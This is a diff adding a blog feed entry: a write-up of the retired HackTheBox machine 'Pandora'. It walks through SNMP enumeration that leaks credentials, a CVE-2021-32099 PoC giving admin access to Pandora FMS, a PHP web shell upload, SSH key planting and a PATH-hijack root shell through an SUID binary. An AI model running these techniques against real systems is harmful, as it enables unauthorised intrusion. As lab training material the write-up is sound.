@@ -1,5 +1,199 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2022-04-25T15:40:00+02:00</updated><entry><title>HTB: Backdoor</title><link href="https://maggick.fr/2022/04/htb-backdoor.html" rel="alternate"></link><published>2022-04-25T15:40:00+02:00</published><updated>2022-04-25T15:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-04-25:/2022/04/htb-backdoor.html</id><summary type="html">&lt;p&gt;&lt;img alt="Backdoor" class="align-left" src="/media/2022.04/backdoor_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2022-05-25T14:25:00+02:00</updated><entry><title>HTB: Pandora</title><link href="https://maggick.fr/2022/05/htb-pandora.html" rel="alternate"></link><published>2022-05-25T14:25:00+02:00</published><updated>2022-05-25T14:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-05-25:/2022/05/htb-pandora.html</id><summary type="html">&lt;p&gt;&lt;img alt="Pandora Card" class="align-left" src="/media/2022.05/pandora_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.com/home/machines/profile/423"&gt;Pandora&lt;/a&gt; publish on
+January 8, 2022 by
+&lt;a href="https://www.hackthebox.com/home/users/profile/114053"&gt;TheCyberGeek&lt;/a&gt; and
+&lt;a href="https://www.hackthebox.com/home/users/profile/610173"&gt;dmw0ng&lt;/a&gt;.
+This box is rated as an easy machine. It implies an UDP service, a localy
+exposed vulnerable application and an SUID binary.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2022.05/pandora_card.png" alt="Pandora Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.com/home/machines/profile/423"&gt;Pandora&lt;/a&gt; publish on
+January 8, 2022 by
+&lt;a href="https://www.hackthebox.com/home/users/profile/114053"&gt;TheCyberGeek&lt;/a&gt; and
+&lt;a href="https://www.hackthebox.com/home/users/profile/610173"&gt;dmw0ng&lt;/a&gt;.
+This box is rated as an easy machine. It implies an UDP service, a localy
+exposed vulnerable application and an SUID binary.&lt;/p&gt;
+
+
+&lt;h1 id="foothold-and-user"&gt;Foothold and user&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
+open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sat Feb  5 11:08:18 2022 as: nmap -p- -oN notes.md -sSV 10.129.157.82&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.129.157.82&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.014s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 closed tcp ports (reset)&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Looking at the web pages we do no find anything useful. We run an UDP scan and
+found that port 161 (SNMP) is open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sat Feb 27 10:34:49 2022 as: nmap -sSU -oN udp_scan 10.129.148.185&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for panda.htb (10.129.148.185)&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 998 closed udp ports (port-unreach), 998 closed tcp ports (reset)&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT    STATE         SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp  open          ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp  open          http&lt;/span&gt;
+&lt;span class="code-line"&gt;68/udp  open|filtered dhcpc&lt;/span&gt;
+&lt;span class="code-line"&gt;161/udp open          snmp&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="snmp-service"&gt;SNMP service&lt;/h2&gt;
+&lt;p&gt;We use &lt;a href="https://github.com/trailofbits/onesixtyone"&gt;onesixtyone&lt;/a&gt; to found the
+community string. Only &lt;code&gt;public&lt;/code&gt; seems to be available.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ onesixtyone 10.129.148.185 -c wordlist-common-snmp-community-strings.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Scanning 1 hosts, 122 communities&lt;/span&gt;
+&lt;span class="code-line"&gt;10.129.148.185 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64&lt;/span&gt;
+&lt;span class="code-line"&gt;10.129.148.185 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We use the &lt;code&gt;snmp_enum&lt;/code&gt; module of &lt;code&gt;msfconsole&lt;/code&gt; to enumerate the SNMP information.
+And found that a process that is using a username and a password in the command
+line.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf6 auxiliary(scanner/snmp/snmp_enum) &amp;gt; show options&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Module options (auxiliary/scanner/snmp/snmp_enum):&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  Name       Current Setting  Required  Description&lt;/span&gt;
+&lt;span class="code-line"&gt;  ----       ---------------  --------  -----------&lt;/span&gt;
+&lt;span class="code-line"&gt;  COMMUNITY  public           yes       SNMP Community String&lt;/span&gt;
+&lt;span class="code-line"&gt;  RETRIES    1                yes       SNMP Retries&lt;/span&gt;
+&lt;span class="code-line"&gt;  RHOSTS     10.129.148.185   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi&lt;/span&gt;
+&lt;span class="code-line"&gt;                                        ki/Using-Metasploit&lt;/span&gt;
+&lt;span class="code-line"&gt;  RPORT      161              yes       The target port (UDP)&lt;/span&gt;
+&lt;span class="code-line"&gt;  THREADS    1                yes       The number of concurrent threads (max one per host)&lt;/span&gt;
+&lt;span class="code-line"&gt;  TIMEOUT    1                yes       SNMP Timeout&lt;/span&gt;
+&lt;span class="code-line"&gt;  VERSION    1                yes       SNMP Version &amp;lt;1/2c&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;msf6 auxiliary(scanner/snmp/snmp_enum) &amp;gt; run&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] 10.129.148.185, Connected.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] System information:&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Host IP           : 10.129.148.185&lt;/span&gt;
+&lt;span class="code-line"&gt;Hostname          : pandora&lt;/span&gt;
+&lt;span class="code-line"&gt;Description       : Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64&lt;/span&gt;
+&lt;span class="code-line"&gt;Contact           : Daniel&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;984  runnable  sh  /bin/sh  -c sleep 30; /bin/bash -c &amp;#39;/usr/bin/host_check -u daniel -p HotelBabylon23&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="pandora"&gt;Pandora&lt;/h2&gt;
+&lt;p&gt;We test this credentials on the SSH service and they are working. We check this
+&lt;code&gt;host_check&lt;/code&gt; process and found that a web application is exposed on locally.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh daniel@10.129.148.185  # HotelBabylon23&lt;/span&gt;
+&lt;span class="code-line"&gt;daniel@pandora:~$ ltrace /usr/bin/host_check -u daniel -p HotelBabylon23&lt;/span&gt;
+&lt;span class="code-line"&gt;puts(&amp;quot;PandoraFMS host check utility&amp;quot;PandoraFMS host check utility&lt;/span&gt;
+&lt;span class="code-line"&gt;)                                                                                                             = 30&lt;/span&gt;
+&lt;span class="code-line"&gt;puts(&amp;quot;Now attempting to check PandoraF&amp;quot;...Now attempting to check PandoraFMS registered hosts.&lt;/span&gt;
+&lt;span class="code-line"&gt;)                                                                                                       = 53&lt;/span&gt;
+&lt;span class="code-line"&gt;puts(&amp;quot;Files will be saved to ~/.host_c&amp;quot;...Files will be saved to ~/.host_check&lt;/span&gt;
+&lt;span class="code-line"&gt;)                                                                                                       = 37&lt;/span&gt;
+&lt;span class="code-line"&gt;system(&amp;quot;/usr/bin/curl &amp;#39;http://127.0.0.1/&amp;quot;... &amp;lt;no return ...&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--- SIGCHLD (Child exited) ---&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;... system resumed&amp;gt; )                                                                                                                            = 0&lt;/span&gt;
+&lt;span class="code-line"&gt;sleep(1775726^C &amp;lt;no return ...&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--- SIGINT (Interrupt) ---&lt;/span&gt;
+&lt;span class="code-line"&gt;+++ killed by SIGINT +++&lt;/span&gt;
+&lt;span class="code-line"&gt;daniel@pandora:~$ curl http://127.0.0.1/&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;meta HTTP-EQUIV=&amp;quot;REFRESH&amp;quot; content=&amp;quot;0; url=/pandora_console/&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We mount a SSH tunnel &lt;code&gt;ssh daniel@10.129.148.185 -D 9090&lt;/code&gt; and add the SOCKS
+proxy in the Burp options and browse to &lt;code&gt;127.0.0.1&lt;/code&gt;. We found out that the
+application is Pandora FMS v7.0NG. Looking for exploit on Google we found out a
+&lt;a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained"&gt;Sonarsource blog article&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;As we do not have any account (daniel's can only use the API) we are looking for
+a &lt;a href="https://github.com/zjicmDarkWing/CVE-2021-32099"&gt;PoC for CVE-2021-32099 on github&lt;/a&gt;
+this seems to be a PoC specially crafted for HTB.
+We copy the URL and add our session cookie at the end of it, allowing us to get
+an admin access to the application.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Admin account" src="/media/2022.05/pandora_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;Using the "File manager" in "admin tools", we are able to upload
+&lt;code&gt;/usr/share/webshells/php/simple-backdoor.php&lt;/code&gt; on the application. The page tell
+us that we are uploading in &lt;code&gt;images&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="File upload" src="/media/2022.05/pandora_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;We can then access &lt;code&gt;http://127.0.0.1/pandora_console/images/simple-backdoor.php?cmd=id&lt;/code&gt;
+to run the &lt;code&gt;id&lt;/code&gt; command on the box and get the expected result:
+&lt;code&gt;uid=1000(matt) gid=1000(matt) groups=1000(matt)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We create a &lt;code&gt;.ssh&lt;/code&gt; folder in matt's home directory and put our SSH public key in
+the &lt;code&gt;authorized_keys&lt;/code&gt; file. We are now able to connect to the box as &lt;code&gt;matt&lt;/code&gt; and
+grab the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh matt@10.129.156.46&lt;/span&gt;
+&lt;span class="code-line"&gt;matt@pandora:~$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;0922da287177a016913cb69eb003c0d8&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;We start our enumeration and look for SUID binaries and found a binary called
+&lt;code&gt;pandora_backup&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;matt@pandora:/$ find / -perm -4000 -type f -exec ls -la {} 2&amp;gt;/dev/null \;&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 85064 Jul 14  2021 /usr/bin/chfn&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 88464 Jul 14  2021 /usr/bin/gpasswd&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 39144 Jul 21  2020 /usr/bin/umount&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 55528 Jul 21  2020 /usr/bin/mount&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 67816 Jul 21  2020 /usr/bin/su&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 53040 Jul 14  2021 /usr/bin/chsh&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Looking at the calls from this binary, we can see that it call &lt;code&gt;tar&lt;/code&gt; with a
+relative PATH.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;matt@pandora:/$ ltrace /usr/bin/pandora_backup&lt;/span&gt;
+&lt;span class="code-line"&gt;getuid()                                                               = 1000&lt;/span&gt;
+&lt;span class="code-line"&gt;geteuid()                                                              = 1000&lt;/span&gt;
+&lt;span class="code-line"&gt;setreuid(1000, 1000)                                                   = 0&lt;/span&gt;
+&lt;span class="code-line"&gt;puts(&amp;quot;PandoraFMS Backup Utility&amp;quot;PandoraFMS Backup Utility&lt;/span&gt;
+&lt;span class="code-line"&gt;)                                      = 26&lt;/span&gt;
+&lt;span class="code-line"&gt;puts(&amp;quot;Now attempting to backup Pandora&amp;quot;...Now attempting to backup PandoraFMS client&lt;/span&gt;
+&lt;span class="code-line"&gt;)                            = 43&lt;/span&gt;
+&lt;span class="code-line"&gt;system(&amp;quot;tar -cvf /root/.backup/pandora-b&amp;quot;...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied&lt;/span&gt;
+&lt;span class="code-line"&gt;tar: Error is not recoverable: exiting now&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;no return ...&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--- SIGCHLD (Child exited) ---&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;... system resumed&amp;gt; )                                                 = 512&lt;/span&gt;
+&lt;span class="code-line"&gt;puts(&amp;quot;Backup failed!\nCheck your permis&amp;quot;...Backup failed!&lt;/span&gt;
+&lt;span class="code-line"&gt;Check your permissions!&lt;/span&gt;
+&lt;span class="code-line"&gt;)                           = 39&lt;/span&gt;
+&lt;span class="code-line"&gt;+++ exited (status 1) +++&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The use of a relative PATH allow us to use a custom PATH to execute a custom
+&lt;code&gt;tar&lt;/code&gt; that will just spawn a root shell.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;matt@pandora:~$ mktemp -d&lt;/span&gt;
+&lt;span class="code-line"&gt;/tmp/tmp.yHz9XgyjVw&lt;/span&gt;
+&lt;span class="code-line"&gt;matt@pandora:~$ echo &amp;#39;/bin/bash&amp;#39; &amp;gt; /tmp/tmp.yHz9XgyjVw/tar&lt;/span&gt;
+&lt;span class="code-line"&gt;matt@pandora:~$ export PATH=/tmp/tmp.yHz9XgyjVw:$PATH&lt;/span&gt;
+&lt;span class="code-line"&gt;matt@pandora:~$ chmod +x /tmp/tmp.yHz9XgyjVw/tar&lt;/span&gt;
+&lt;span class="code-line"&gt;matt@pandora:~$ /usr/bin/pandora_backup&lt;/span&gt;
+&lt;span class="code-line"&gt;PandoraFMS Backup Utility&lt;/span&gt;
+&lt;span class="code-line"&gt;Now attempting to backup PandoraFMS client&lt;/span&gt;
+&lt;span class="code-line"&gt;root@pandora:~# id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=0(root) gid=1000(matt) groups=1000(matt)&lt;/span&gt;
+&lt;span class="code-line"&gt;root@pandora:~# cat /root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;8975a2739d6bc02170645feb6607b6db&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;A nice box with a really interesting user part with multiple stage, the UDP
+service is easy to miss as there is not a lot of boxes with them and the UDP
+scan are pretty slow. The chaining of different vulnerabilities in the Pandora
+application is also interesting. Finally the root part is trivial.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="suid"></category><category term="snmp"></category><category term="pandora"></category></entry><entry><title>HTB: Backdoor</title><link href="https://maggick.fr/2022/04/htb-backdoor.html" rel="alternate"></link><published>2022-04-25T15:40:00+02:00</published><updated>2022-04-25T15:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-04-25:/2022/04/htb-backdoor.html</id><summary type="html">&lt;p&gt;&lt;img alt="Backdoor" class="align-left" src="/media/2022.04/backdoor_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.com/home/machines/profile/416"&gt;Backdoor&lt;/a&gt; publish on
 November 20, 2021 by
